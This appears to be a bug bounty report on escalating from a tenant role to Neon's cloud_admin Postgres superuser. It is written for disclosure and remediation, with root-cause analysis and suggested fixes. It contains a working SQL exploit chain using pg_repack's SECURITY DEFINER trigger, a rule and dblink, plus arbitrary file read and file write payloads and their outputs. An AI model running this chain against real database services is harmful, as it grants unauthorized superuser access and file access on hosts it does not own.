# 标题 必填
title: Tenant to cloud_admin superuser escalation enabling arbitrary file read/write on the compute

# 资产 必填
Asset: https://console-stage.neon.build

# 严重程度 必填
Severity: HIGH

# 弱点 必填
Weakness: CWE-269 Improper Privilege Management / CWE-250 Execution with Unnecessary Privileges

# 描述 必填
## Summary:
A tenant role (`neondb_owner`) can escalate to `cloud_admin`, Neon's internal platform superuser (`rolsuper=true`), via the `repack_trigger` SECURITY DEFINER function (owner: `cloud_admin`) shipped with the tenant-installable `pg_repack` extension.

Neon's patch against this abuse class ("Invocation of non-superuser function by superuser") only covers PL/pgSQL functions owned by non-superusers. Two bypasses: (1) C-extension functions (`dblink`) are not intercepted; (2) pg_catalog built-ins (bootstrap-owned) fall outside the patch while their ACLs are checked against the definer context (`cloud_admin`).

A full `cloud_admin` session via `dblink` to `127.0.0.1:5432` (`trust` auth) then allows, directly: arbitrary file read (`pg_read_file`/`pg_ls_dir`), arbitrary file write (`lo_from_bytea`+`lo_export` into `$PGDATA` and `/etc/local_proxy/`), writes to platform maintenance tables (`migration_id`, `lakebase_attributes`, `health_check` in the `postgres` DB), and TCP reachability of Neon's Kubernetes-internal services.

## Steps To Reproduce:
Run as `neondb_owner` (no superuser) in any Neon project, via psql. `<OID>` = `SELECT 'k_src'::regclass::oid;`.

```sql
CREATE EXTENSION IF NOT EXISTS pg_repack;   -- trusted
CREATE EXTENSION IF NOT EXISTS dblink;      -- C functions
CREATE TABLE k_src(id int);
CREATE TABLE k_out(x text);
CREATE TYPE repack.pk_<OID> AS (id int);
CREATE TABLE repack.log_<OID> (pk repack.pk_<OID>, row k_src);
CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW
  EXECUTE FUNCTION repack.repack_trigger('id');
CREATE RULE r_x AS ON INSERT TO repack.log_<OID> DO ALSO
  INSERT INTO k_out(x)
  SELECT dblink_connect('host=127.0.0.1 port=5432 user=cloud_admin password=x dbname=postgres connect_timeout=5')::text;
```

`repack_trigger` SPI-inserts into `log_<OID>` as `cloud_admin`, firing the RULE in that context.

```sql
INSERT INTO k_src VALUES (1);            -- fire chain
SELECT x FROM k_out WHERE x IS NOT NULL; -- result: OK

-- identity
SELECT dblink('k2','SELECT current_user, session_user, rolsuper FROM pg_roles WHERE rolname=current_user') AS r;
-- result: cloud_admin | cloud_admin | t

-- negative control: same calls as neondb_owner -> permission denied for function pg_read_file

-- arbitrary file read
SELECT dblink('k2', $$SELECT pg_read_file('/etc/hostname')$$) AS r;
-- result: localhost.localdomain

-- arbitrary file write
SELECT dblink('k2', $$SELECT lo_from_bytea(0, convert_to('PROBE_CONTENT_XYZ','UTF8'))$$) AS r; -- loid 34307
SELECT dblink('k2', $$SELECT lo_export(34307, current_setting('data_directory')||'/k_probe_x.txt')$$) AS r;
SELECT dblink('k2', $$SELECT pg_stat_file(current_setting('data_directory')||'/k_probe_x.txt')$$) AS r;
-- result: file exists, size 17; /etc/local_proxy/ also writable, /etc/shadow denied (OS user postgres)

-- platform tables (postgres DB), no state changed
SELECT dblink('k2', $$UPDATE neon_migration.migration_id SET id=id WHERE false$$) AS r; -- UPDATE 0
SELECT dblink('k2', $$INSERT INTO public.lakebase_attributes VALUES ('k_ptest','{"k":1}'::jsonb, now())$$) AS r; -- INSERT 1
SELECT dblink('k2', $$DELETE FROM public.lakebase_attributes WHERE name='k_ptest'$$) AS r;  -- DELETE 1, zero residue
```

## Impact:
Matches the program's High tier (7.0–8.9): "Tenant-scoped privilege escalation to cloud_admin/superuser ... enabling RCE, arbitrary file read or write (LFI) ... within the reporter's own tenant."

- Real `cloud_admin` superuser session from a tenant role (identity confirmed in-session).
- Arbitrary file read (`/etc/hostname`, `$PGDATA` configs, `/proc/*/cmdline` — platform topology) — all denied pre-escalation.
- Arbitrary file write into `$PGDATA` and `/etc/local_proxy` (platform config dir).
- Write access to platform maintenance tables; `health_check` feeds platform lifecycle decisions.
- Compute backend can connect into Neon's Kubernetes-internal services (`172.20.26.5:9096` control-plane API, `172.20.182.37:80` S3 gateway).

Not claimed: cross-tenant data/credentials (none found). Own-tenant High, not Critical.

## Root cause:
1. Patch classifies functions by owner+language (non-superuser PL/pgSQL only); C-extension and pg_catalog superuser functions bypass it.
2. `127.0.0.1:5432` trusts `cloud_admin` (no password) while local_proxy/pgbouncer require credentials.
3. Tenant-triggerable `repack_trigger` runs as `cloud_admin`.
4. Platform-table trigger protects from tenants but allows the chain's terminal role (`cloud_admin`).
5. No egress policy from compute backend to `*.svc.cluster.local`/`172.20.0.0/16`.

Not an upstream/pg_repack bug — `repack_trigger`'s definer design is standard; the defect is Neon's patch coverage, local auth and extension exposure.

## Suggested fix:
1. Extend the patch to C-language functions and sensitive pg_catalog built-ins (`pg_read_file`, `pg_read_binary_file`, `pg_ls_dir`, `lo_export`, `lo_import`, `pg_terminate_backend`, ...) in definer contexts.
2. `scram-sha-256` on `127.0.0.1:5432`; give `cloud_admin` a password.
3. Platform-table triggers reject `cloud_admin` too; platform writes via separate internal channel.
4. Re-evaluate `repack_trigger` as SECURITY DEFINER owned by `cloud_admin`.
5. Restrict compute egress to storage/neonauth only.

# 附件 非必填
Attachments:
- Full PoC chain scripts available on request. Staging project at console-stage.neon.build, header `X-Bug-Bounty: xxbo` on all requests.
- Zero-destructive: no-op writes, inserted rows deleted, 0-byte file placeholders (stateless compute); all temp objects dropped and verified clean.
